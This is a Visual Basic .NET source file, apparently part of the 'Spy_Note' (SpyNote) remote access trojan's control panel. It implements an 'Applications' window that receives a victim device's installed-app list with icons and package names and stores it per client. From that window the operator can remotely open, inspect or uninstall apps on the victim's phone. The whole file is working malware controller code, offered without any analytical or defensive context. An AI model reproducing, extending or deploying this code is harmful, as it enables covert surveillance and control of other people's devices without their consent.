Imports System.IO
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Applications
    Public Sub New()
        Me.imageList_0 = New ImageList()
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim num As Integer = 0
                Dim flag2 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                If flag2 Then
                    Dim separator As String() = New String() {"[My/Exception]"}
                    Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                    Me.Label1.Text = array(0)
                    Dim flag3 As Boolean = Not Me.Panel3.Visible
                    If flag3 Then
                        Me.Panel3.Visible = True
                    End If
                Else
                    Me.DataGridView1.Rows.Clear()
                    Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Line}
                    Dim array2 As String() = data.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                    Dim stringBuilder As StringBuilder = New StringBuilder()
                    Dim num2 As Integer = array2.Length - 1
                    For i As Integer = 0 To num2
                        Dim separator3 As String() = New String() {My.Forms.Form1.s.split_Ary}
                        Dim array3 As String() = array2(i).Split(separator3, StringSplitOptions.RemoveEmptyEntries)
                        Dim buffer As Byte() = Convert.FromBase64String(array3(2))
                        Dim memoryStream As MemoryStream = New MemoryStream(buffer)
                        Dim value As Bitmap = New Bitmap(Image.FromStream(memoryStream))
                        Me.imageList_0.Images.Add(value)
                        memoryStream.Dispose()
                        Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(num), array3(0), array3(1), array3(3), array3(4)})
                        stringBuilder.AppendFormat("{0}", String.Concat(New String() {array3(0), " , ", array3(1), " , ", array3(3), " , ", array3(4), vbCrLf}))
                        Dim flag4 As Boolean = Operators.CompareString(array3(5), array3(1), False) = 0
                        If flag4 Then
                            Me.DataGridView1.Rows(num).Cells(2).Style.ForeColor = Color.SeaGreen
                        End If
                        num += 1
                    Next
                    store_0.Save_0(Me.Name_Client + Me.Client_ID + "\Applications", stringBuilder.ToString())
                    Dim visible As Boolean = Me.Panel3.Visible
                    If visible Then
                        Me.Panel3.Visible = False
                    End If
                    Me.refres_title()
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("Applications - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", New Object() {Me.Client_remote_Address, Me.Name_Client, Conversions.ToString(Me.DataGridView1.Rows.Count), Conversions.ToString(Me.DataGridView1.SelectedRows.Count)})
        Me.Text = text
    End Sub

    Private Sub Applications_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.UninstallToolStripMenuItem.Image = store_0.Bitmap_0("ctx_delete")
        Me.RefreshToolStripMenuItem.Image = store_0.Bitmap_0("ctx_refresh")
        Me.OpenAppToolStripMenuItem.Image = store_0.Bitmap_0("ctx_open_app")
        Me.PackageInfoToolStripMenuItem.Image = store_0.Bitmap_0("ctx_info")
        Me.ContextMenuStrip1.Renderer = New Theme_0()
        Me.imageList_0.ImageSize = New Size(96, 96)
        Me.imageList_0.ColorDepth = ColorDepth.Depth32Bit
        Me.refres_title()
        MyBase.Icon = store_0.icons_0("window")
    End Sub

    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        Me.refres_title()
    End Sub

    Private Sub OpenAppToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenAppToolStripMenuItem.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                My.Forms.Form1.s.Send(Me.handle_Number_Client, Conversions.ToString(Operators.AddObject("open_app" + My.Forms.Form1.s.SplitData, Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(2).Value)))
            Next
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "applications")
    End Sub

    Private Sub DataGridView1_ColumnWidthChanged(sender As Object, e As DataGridViewColumnEventArgs) Handles DataGridView1.ColumnWidthChanged
        Dim column As DataGridViewColumn = e.Column
        Dim dataGridViewColumn As DataGridViewColumn = Me.DataGridView1.Columns(0)
        Dim flag As Boolean = dataGridViewColumn.Width > 95
        If flag Then
            e.Column.Width = 95
        End If
    End Sub

    Private Sub PackageInfoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PackageInfoToolStripMenuItem.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                My.Forms.Form1.s.Send(Me.handle_Number_Client, Conversions.ToString(Operators.AddObject("package_info" + My.Forms.Form1.s.SplitData, Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(2).Value)))
            Next
        End If
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                My.Forms.Form1.s.Send(Me.handle_Number_Client, Conversions.ToString(Operators.AddObject("uninstall" + My.Forms.Form1.s.SplitData, Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(2).Value)))
            Next
        End If
    End Sub


    Private imageList_0 As ImageList
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
End Class